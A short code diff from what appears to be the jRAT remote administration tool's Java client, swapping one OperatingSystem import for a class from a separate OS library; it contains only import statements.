@@ -22,7 +22,8 @@ import se.jrat.client.Main;
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet76Speech;
 import se.jrat.client.utils.IOUtils;
-import se.jrat.common.OperatingSystem;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 @SuppressWarnings("serial")
